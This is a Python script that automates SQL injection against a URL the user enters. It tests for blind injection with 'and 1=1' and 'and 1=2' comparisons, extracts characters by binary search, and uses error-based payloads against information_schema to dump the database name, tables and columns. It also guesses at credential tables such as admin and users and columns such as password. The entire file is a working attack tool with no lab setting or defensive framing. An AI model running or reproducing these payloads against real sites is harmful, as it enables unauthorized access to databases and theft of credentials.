import requests
import sys
import time

page_length_success = 0
page_length_failure = 0

# table names expected to exist. You can add more to the list if you find other table names
table_names = ['admin', 'users', 'admins', 'administrators', 'login', 'user']

# column_names expected to exist. You can add more to the list if you find other column names
column_names = ['uname', 'username', 'usrname', 'usernames', 'admin', 'admins', 'administrator', 'administrators', 'id',
				'pass', 'password', 'passwrd', 'passwd', 'custname', 'customer_name', 'customername', 'cust_name',
				'c_name', 'cname', 'login', 'login_name', 'loginname', 'lname', 'l_name']

exploit_dict = {}
exploit_tables = {}

'''
validate_vulnerable(url) takes the absolute path of url as input and validates
if the url is vulnerable. It also differentiates between success and failure 
messages if the url is vulnerable.
'''


def validate_vulnerable(url):
	success_url = url + " and 1=1"
	failure_url = url + " and 1=2"
	page_content = requests.get(url)
	page_content_success = requests.get(success_url)
	page_content_failure = requests.get(failure_url)

	page_success = page_content_success.text
	page_failure = page_content_failure.text

	global page_length_success
	global page_length_failure

	page_length = len(page_content.text)
	page_length_success = len(page_content_success.text)
	page_length_failure = len(page_content_failure.text)

	if page_length_success != page_length_failure and page_length == page_length_success:
		print "URL is vulnerable"
		return [page_length_success, page_length_failure]
	else:
		print "URL is not vulnerable"
		return None


def execute_query(query):
	check = len(requests.get(query).text)
	if check == page_length_success:
		return True
	else:
		return False


def binSearch(query, low, high):
	l = low
	h = high
	mid = 0
	while True:
		mid = (l + h) / 2
		if execute_query(query + "=" + str(mid)):
			break
		elif execute_query(query + ">" + str(mid)):
			l = mid + 1
		elif execute_query(query + "<" + str(mid)):
			h = mid
		else:
			print "End of Rows"
			sys.exit(0)

	return mid


def version_of_query(query):
	i = 1
	result = []
	while True:
		val = binSearch(query + " and ascii(substring(@@version," + str(i) + ",1))", 0, 127)
		i += 1
		if chr(val) != '\x00':
			result.append(chr(val))
		else:
			break
	print "".join(result)


def get_table_names(query):
	# t = []
	for i in table_names:
		res = len(requests.get(query + " and (select 1 from " + i + " limit 0,1)=1").text)
		if res == page_length_success:
			return i


def get_column_names(query, tname):
	c = []
	for i in column_names:
		res = len(requests.get(
			query + " and (select substring(concat(1," + i + "),1,1) from " + tname + " limit 0,1)=1").text)
		if res == page_length_success:
			c.append(i)
	return c


def get_data(url, tname, cnames):
	cols = ",0x3a,".join(cnames)
	i, j = 1, 1
	res = []
	result = []
	print ':'.join(cnames)
	while True:
		val = binSearch(
			url + " and ascii(substring((SELECT concat(" + cols + ") from " + tname + " limit " + str(j) + ",1)," + str(
				i) + ",1))", 0, 127)
		i += 1
		if chr(val) != '\x00':
			res.append(chr(val))

		else:
			i = 1
			j += 1
			result.append(''.join(res))
			print ''.join(res)

		if j == 2:
			break
	print result

def splitascii(hexVal):
	tempHex = hexVal.split("'~1'")[0].split("'~'")[1]
	return tempHex

def getDatabase(url):
	exploitQuery = " and(select 1 from(select count(*),concat((select " \
				   "(select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) " \
				   "from information_schema.tables limit 0,1),floor(rand(0)*2))x from " \
				   "information_schema.tables group by x)a) and 1=1"
	res = requests.get(url + exploitQuery).text
	exploit_dict['dbNameAscii'] = str(splitascii(res))
	exploitVal = exploit_dict['dbNameAscii'].decode('hex')
	exploit_dict['dbName'] = exploitVal
 	print "Database Name: " + exploitVal

def gettablescount(url):
	tempVal = exploit_dict.get('dbNameAscii')
	exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(table_name)," \
				   "0x27,0x7e) FROM `information_schema`.tables WHERE table_schema=0x"+ tempVal + ")) " \
				   "from information_schema.tables limit 0,1),floor(rand(0)*2))x " \
				   "from information_schema.tables group by x)a) and 1=1"
	res = requests.get(url + exploitQuery).text
	exploitVal = splitascii(res)
	exploit_dict['tableCount'] = int(exploitVal)
	print "Number of Tables in the Database:" +  str(exploitVal)

def gettablenames(url):
	tempCount = exploit_dict.get('tableCount')
	tempVal = exploit_dict.get('dbNameAscii')
	exploit_dict['tableNames'] = []
	exploit_dict['tableNameAscii'] = []
	for i in range(1,tempCount):
		exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT distinct " \
				   "concat(0x7e,0x27,Hex(cast(table_name as char)),0x27,0x7e) FROM information_schema.tables " \
				   "Where table_schema=0x"+tempVal+" limit "+str(i)+",1)) from information_schema.tables " \
				   "limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
		# print exploitQuery
		res = requests.get(url + exploitQuery).text
		exploit_dict['tableNameAscii'].append(str(splitascii(res)))
		exploitVal = splitascii(res).decode('hex')
		exploit_dict['tableNames'].append(exploitVal)
	# print "Table Names in DB:\n"+'\n'.join(exploit_dict['tableNames'])

def getcolumncount(url):
	tempDBName = exploit_dict.get('dbNameAscii')
	tempTableNamesHex = exploit_dict.get('tableNameAscii')
	tempTableNames = exploit_dict.get('tableNames')
	tablesLen = len(tempTableNames)
	for i in range(0,tablesLen):
		temp = {}
		exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
					   "count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE " \
					   "table_schema=0x"+ tempDBName +" AND table_name=0x"+ tempTableNamesHex[i] +")) " \
					   "from information_schema.tables limit 0,1),floor(rand(0)*2))x " \
					   "from information_schema.tables group by x)a) and 1=1"
		res = requests.get(url + exploitQuery).text
		exploitVal = splitascii(res)
		temp['count'] = int(exploitVal)
		exploit_tables[tempTableNamesHex[i].decode('hex')] = temp
		print tempTableNames[i] + " : " + exploitVal

def getcolumnnames(url):
	tempDBNameHex = exploit_dict.get('dbNameAscii')
	tempTableNamesHex = exploit_dict.get('tableNameAscii')
	tempTableNames = exploit_dict.get('tableNames')
	tablesLen = len(tempTableNames)
	tempArr = []
	tableOneLen = exploit_tables[tempTableNames[1]].get('count')
	for i in range(0,tableOneLen):
		executeQuery = " and(select 1 from(select count(*),concat((select (select (SELECT distinct " \
					   "concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema.columns " \
					   "Where table_schema=0x"+tempDBNameHex+" AND table_name=0x"+tempTableNamesHex[1]+" limit "+str(i)+",1))" \
					   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
		res = requests.get(url + executeQuery).text
		exploitVal = splitascii(res)
		tempArr.append(exploitVal.decode('hex'))
	print tempArr

if __name__ == "__main__":
	web_url = raw_input("Enter website with absolute url:\n")
	status_code = validate_vulnerable(web_url)
	if status_code == None:
		sys.exit(0)
	else:
		# version_of_query(web_url)
		# tables = get_table_names(web_url)
		# columns = get_column_names(web_url,tables)
		# get_data(web_url,tables,columns)
		getDatabase(web_url)
		gettablescount(web_url)
		gettablenames(web_url)
		getcolumncount(web_url)
		getcolumnnames(web_url)
		print exploit_dict
		print exploit_tables
		'''
		print "Tables"
		print tables
		print "Table_columns"
		for i in columns:
			print i
		'''
